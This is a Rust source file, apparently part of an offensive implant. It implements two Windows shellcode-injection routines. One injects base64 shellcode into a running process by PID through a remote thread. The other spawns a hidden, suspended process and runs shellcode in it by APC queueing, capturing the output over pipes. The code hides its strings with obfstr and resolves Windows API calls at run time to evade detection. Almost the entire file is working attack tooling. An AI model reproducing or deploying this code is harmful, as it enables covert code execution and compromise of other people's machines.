#![allow(non_snake_case)]
extern crate winapi;

use std::{
    io::{
        Error,
        ErrorKind::BrokenPipe,
        Result,
    },
    mem::{size_of, transmute},
    sync::mpsc::{channel, Receiver},
    thread,
    time::Duration,
};

use winapi::{
    ctypes::c_void,
    shared::{
        ntdef::{HANDLE, TRUE},
        minwindef::{DWORD, LPVOID},
    },
    um::{
        fileapi::ReadFile,
        minwinbase::{SECURITY_ATTRIBUTES, STILL_ACTIVE},
        processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOW},
        winbase::{CREATE_NO_WINDOW, CREATE_SUSPENDED, HANDLE_FLAG_INHERIT},
        winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_ALL_ACCESS},
    },
};
use dynamic_winapi::um::{
    handleapi::{CloseHandle, SetHandleInformation},
    memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory},
    namedpipeapi::CreatePipe,
    processthreadsapi::{
        CreateProcessW, CreateRemoteThreadEx, GetExitCodeThread, OpenProcess,
        QueueUserAPC, ResumeThread,
    },
};

use crate::stdlib::get_wide;

pub fn process_injection(args: Vec<&str>) -> String {
    if args.len() < 2 {
        return obfstr::obfstr!("please specify PID").to_string()
    }

    let pid = match args[1].parse::<u32>() {
        Err(e)  => return e.to_string(),
        Ok(pid) => pid,
    };
    let shellcode_b64 = args[2];
    let mut shellcode = base64::decode(shellcode_b64).unwrap();
    let shellcode_ptr: *mut c_void = shellcode.as_mut_ptr() as *mut c_void; 

    // get process handle
    let handle = unsafe {OpenProcess().unwrap()(
        PROCESS_ALL_ACCESS,
        0x01,
        pid
    )};

    // alloc payload
    let addr_shellcode = unsafe {VirtualAllocEx().unwrap()(
        handle,
        0 as _,
        shellcode.len(),
        MEM_COMMIT,
        PAGE_READWRITE
    )};
    let mut ret_len: usize = 0;
    let _ = unsafe {WriteProcessMemory().unwrap()(
        handle,
        addr_shellcode,
        shellcode_ptr,
        shellcode.len(),
        &mut ret_len
    )};

    // protect and execute
    let mut old_protect: u32 = 0;
    let _ = unsafe {VirtualProtectEx().unwrap()(
        handle,
        addr_shellcode,
        shellcode.len(),
        PAGE_EXECUTE_READ,
        &mut old_protect
    )};
    let _ = unsafe {CreateRemoteThreadEx().unwrap()(
        handle,
        0 as _,
        0,
        transmute(addr_shellcode),
        0 as _,
        0,
        0 as _,
        0 as _
    )};

    obfstr::obfstr!("success").to_string()
}

struct HandleSend {
    handle: *mut c_void,
}

unsafe impl Send for HandleSend {}

pub fn execute_shellcode(args: Vec<&str>) -> String {
    if args.len() < 2 {
        return "".to_string()
    }

    // extract arguments
    let process = args[1];
    let shellcode_b64 = args[2];
    let mut shellcode = base64::decode(shellcode_b64).unwrap();
    let shellcode_ptr: *mut c_void = shellcode.as_mut_ptr() as *mut c_void; 

    // dynamically resolve required functions
    let CreatePipe = CreatePipe().unwrap();
    let SetHandleInformation = SetHandleInformation().unwrap();
    let CreateProcessW = CreateProcessW().unwrap();
    let QueueUserAPC = QueueUserAPC().unwrap();
    let CloseHandle = CloseHandle().unwrap();
    let GetExitCodeThread = GetExitCodeThread().unwrap();
    let ResumeThread = ResumeThread().unwrap();

    let mut std_in_r: HANDLE = 0 as _;
    let mut std_in_w: HANDLE = 0 as _;
    let mut std_out_r: HANDLE = 0 as _;
    let mut std_out_w: HANDLE = 0 as _;
    // sec attributes
    let mut sa = SECURITY_ATTRIBUTES {
        nLength: size_of::<SECURITY_ATTRIBUTES>() as _,
        lpSecurityDescriptor: 0 as _,
        bInheritHandle: 1,
    };
    // create pipes
    let _ = unsafe { CreatePipe(&mut std_in_r, &mut std_in_w, &mut sa, 0) };
    let _ = unsafe { SetHandleInformation(std_in_w, HANDLE_FLAG_INHERIT, 0) };
    let _ = unsafe { CreatePipe(&mut std_out_r, &mut std_out_w, &mut sa, 0) };
    let _ = unsafe { SetHandleInformation(std_out_r, HANDLE_FLAG_INHERIT, 0) };

    let mut si = STARTUPINFOW{
        cb: size_of::<STARTUPINFOW>() as DWORD,
        lpReserved: 0 as _,
        lpDesktop: 0 as _,
        lpTitle: 0 as _,
        dwX: 0,
        dwY: 0,
        dwXSize: 0,
        dwYSize: 0,
        dwXCountChars: 0,
        dwYCountChars: 0,
        dwFillAttribute: 0,
        dwFlags: 0x00000100,
        wShowWindow: 1,
        cbReserved2: 0,
        lpReserved2: 0 as _,
        hStdInput: std_in_r,
        hStdOutput: std_out_w,
        hStdError: std_out_w,
    };
    let mut pi = PROCESS_INFORMATION{
        hProcess: 0 as _,
        hThread: 0 as _,
        dwProcessId: 0,
        dwThreadId: 0,
    };


    // read shellcode output in thread
    let mut out_buf: Vec<u8> = Vec::new();
    let out_string: String;
    let (tx, rx) = channel::<String>();
    let (tx_kill, rx_kill) = channel::<bool>();
    let tmp_handle = HandleSend {
        handle: std_out_r
    };

    thread::spawn(move || {
        let ret = read_from_pipe(tmp_handle.handle, &mut out_buf, &rx_kill);
        match ret {
            Ok(_) => tx.send(String::from_utf8(out_buf).unwrap()).unwrap(),
            Err(_) => tx.send(obfstr::obfstr!("error reading from pipe").to_string()).unwrap(),
        }
    });

    // spawn suspended process
    let _ = unsafe { CreateProcessW(
        0 as _,
        get_wide(process).as_mut_ptr(),
        0 as _,
        0 as _,
        TRUE as _,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        0 as _,
        0 as _,
        &mut si,
        &mut pi,
    )};

    let handle = pi.hProcess;

    // alloc payload
    let addr_shellcode = unsafe {VirtualAllocEx().unwrap()(
        handle,
        0 as _,
        shellcode.len(),
        MEM_COMMIT,
        PAGE_READWRITE
    )};
    let mut ret_len: usize = 0;
    let _ = unsafe {WriteProcessMemory().unwrap()(
        handle,
        addr_shellcode,
        shellcode_ptr,
        shellcode.len(),
        &mut ret_len
    )};

    // protect
    let mut old_protect: u32 = 0;
    let _ = unsafe {VirtualProtectEx().unwrap()(
        handle,
        addr_shellcode,
        shellcode.len(),
        PAGE_EXECUTE_READ,
        &mut old_protect
    )};

    // Queue shellcode for execution and resume thread
    let _ = unsafe { QueueUserAPC(
        Some(transmute(addr_shellcode)),
        pi.hThread,
        0 as _
    )};
    let _ = unsafe { ResumeThread(pi.hThread) };

    // close handles
    let _ = unsafe { CloseHandle(handle); };
    let _ = unsafe { CloseHandle(std_out_w); };
    let _ = unsafe { CloseHandle(std_in_r); };

    // wait for thread to finish
    loop {
        let mut ret_code: u32 = 0;
        let _ = unsafe {GetExitCodeThread(
            pi.hThread,
            &mut ret_code
        )};
        if ret_code == STILL_ACTIVE {
            continue;
        } else {
            let _ = tx_kill.send(true);
            match rx.recv() {
                Ok(output)  => { 
                    out_string = output; 
                    break; 
                },
                Err(_)      => { 
                    out_string = obfstr::obfstr!("could not get output").to_string(); 
                    break; 
                },
            }
        }
    }
    out_string
}

pub trait IsZero {
    fn is_zero(&self) -> bool;
}

macro_rules! impl_is_zero {
    ($($t:ident)*) => ($(impl IsZero for $t {
        fn is_zero(&self) -> bool {
            *self == 0
        }
    })*)
}

impl_is_zero! { i8 i16 i32 i64 isize u8 u16 u32 u64 usize }

pub fn cvt<I: IsZero>(i: I) -> Result<I> {
    if i.is_zero() { Err(Error::last_os_error()) } else { Ok(i) }
}

pub fn read_from_pipe(handle: HANDLE, buf: &mut Vec<u8>, kill: &Receiver<bool>) -> Result<usize> {
    let mut total_read = 0;
    let kill = kill.to_owned();
    let mut complete = false;
    loop {
        let mut read = 0;
        let mut tmp_buf = [0; 10001];
        let res = cvt(unsafe {
            ReadFile(handle, tmp_buf.as_mut_ptr() as LPVOID, 10001 as _, &mut read, 0 as _)
        });

        match res {
            Ok(_) => {
                buf.extend_from_slice(&tmp_buf);
                total_read = total_read + read;
            },
            Err(ref e) if e.kind() == BrokenPipe => break,
            Err(_) => break,
        }
        if complete {
            continue;
        }
        match kill.recv_timeout(Duration::from_millis(100)) {
            Ok(_) => { complete = true; },
            Err(_) => {},
        }
    }
    Ok(total_read as usize)
}